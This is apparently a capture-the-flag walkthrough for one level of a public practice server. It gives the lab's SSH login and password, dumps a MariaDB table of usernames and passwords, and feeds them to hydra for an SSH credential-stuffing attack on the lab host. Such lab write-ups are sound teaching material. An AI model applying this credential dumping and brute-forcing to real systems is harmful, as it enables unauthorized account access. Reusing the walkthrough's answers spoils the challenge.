@@ -1,0 +1,123 @@
+# Login using the following credentials.
+
+ssh celeste@venus.hackmyvm.eu -p 5000
+
+pwd: VLSNMTKwSV2o8Tn
+
+Mission 0x29:
+The user celeste has access to mysql but for what?
+
+Soln:
+
+-> We have access to SQL, so there must be something over there that we can use to our aid.
+
+-> Access SQL as celeste using her user password for authentication in SQL application.
+
+# celeste@venus:~$ mysql -u celeste -p
+# Enter password: VLSNMTKwSV2o8Tn
+# Welcome to the MariaDB monitor.  Commands end with ; or \g.
+# ....
+# MariaDB [(none)]>
+
+-> Once in first you need to list out all the available databases for the user.
+
+# MariaDB [(none)]>  show databases;
+# +--------------------+
+# | Database           |
+# +--------------------+
+# | information_schema |
+# | venus              |
+# +--------------------+
+# 2 rows in set (0.002 sec)
+
+-> Here we have 2 databases, 'information_schema' which is a default database that comes preinstalled with the software, and then we have 'venus'.
+
+-> Let's select "venus" database and further check for the tables in it.
+
+# MariaDB [(none)]> use venus
+# Reading table information for completion of table and column names
+# Database changed
+# MariaDB [venus]> show tables;
+# +-----------------+
+# | Tables_in_venus |
+# +-----------------+
+# | people          |
+# +-----------------+
+# 1 row in set (0.001 sec)
+# 
+# MariaDB [venus]>
+
+-> We have a table called 'people', digging further more into it using 'select' statement.
+
+# MariaDB [venus]> select * from people;
+# +-----------+---------------+--------------------------------+
+# | id_people | uzer          | pazz                           |
+# +-----------+---------------+--------------------------------+
+# |         1 | nuna          | ixpfdsvcxeqdW                  |
+# |         2 | nona          | ixpvcxvcxeqdW                  |
+# |         3 | manue         | ixpfdsfdseqdW                  |
+# |         4 | samoa         | ixperrewrweqdW                 |
+# |         5 | dsaewq        | ixpefdsfsqdW                   |
+# |...	      | ...	      |	...			       |
+# |        91 | kaka          | ixpeqdW                        |
+# |        92 | nini          | ixpeqdvcxW                     |
+# |        93 | zong          | ixpeqdWfdsfsdf                 |
+# |        94 | nana          | ixpefdsafdsqdW                 |
+# |        95 | ninna         | ixpeqOPUIFDSFDSdW              |
+# +-----------+---------------+--------------------------------+
+# 95 rows in set (0.002 sec)
+
+-> Okay.... We have about 95 records to mess around.
+
+-> Not to worry, we have 'hydra' tool at our despense to work around this mess. We can feed it a list of user and a list of passwords for it to mix and match and brute force our way to the next level.
+
+-> Our only duty left is to format the user list and password list properly.
+
+-> Use the following query to get the data.
+
+# MariaDB [venus]> select uzer,pazz from people;
+
+-> Now you have a output in the form of table infront of you with username, beside which is their respective passwords. Copy the entire thing and paste it into a fresh file on 'gedit' app.
+
+# Incase if you don't have the 'gedit' app, you can install it using the following command. (Gnome Editor)
+# sudo apt-get install gedit -y
+
+-> Gnome editor is nothing but one of many text editors out there. I found this out when I was banging my head against the wall trying to write a python script to remove all the '|','-' and '+' symbols.
+
+-> Once you have the whole 95 records copied over to a fresh file in 'gedit', press 'Ctrl+H' keys or Find and replace option from the menu bar.
+
+-> Replace the following things in order for this to be effective in next step.
+
+# FIND ' | ' -> REPLACE ':'
+# FIND '|' -> REPLACE *blank*
+# FIND '-' -> REPLACE *blank*
+# FIND '+' -> REPLACE *blank* 
+# FIND ' ' -> REPLACE *blank*
+# Avoid the single apostrophe in the above things and copy paste exactly in the same order, and *blank* means to leave the REPLACE field empty.
+
+-> Your file should be looking something like this.
+
+# uzer:pazz
+# nuna:ixpfdsvcxeqdW
+# nona:ixpvcxvcxeqdW
+# manue:ixpfdsfdseqdW
+# samoa:ixperrewrweqdW
+# dsaewq:ixpefdsfsqdW
+
+-> Remove any empty lines present after the first line and remove the 'uzer:pazz' as well. The file should start with 'nuna:ixp....'
+
+-> Now save the file somewhere where you can access it. Because we would be needing the file in the very next step.
+
+-> Go to the directory where you saved the file and run the following command.
+
+# hydra -C <file_name> -s 5000 venus.hackmyvm.eu ssh
+
+-> What it does is that it runs the hydra command with the file given as an input, where :
+	- '-C' -> makes hydra parse the file in the format of user:pass, trying the user against their password only.
+	- '-s' -> to specify the port through which the ssh should be performed.
+
+# -C FILE   colon separated "login:pass" format, instead of -L/-P options. (Excerpt from the help of hydra)
+
+NOTE:
+
+If you dare to use the -L/-P arguements and pass the list of users and passwords seperately, it would start brute forcing each user, trying all the passwords mentioned in the password file for each user, making it a n*n attempts. As we have the users and their passwords against them mentioned in the database, we don't even need to mix and match the passwords. We just need to feed the user and their respective passwords and check for the bell to ring and bingo...
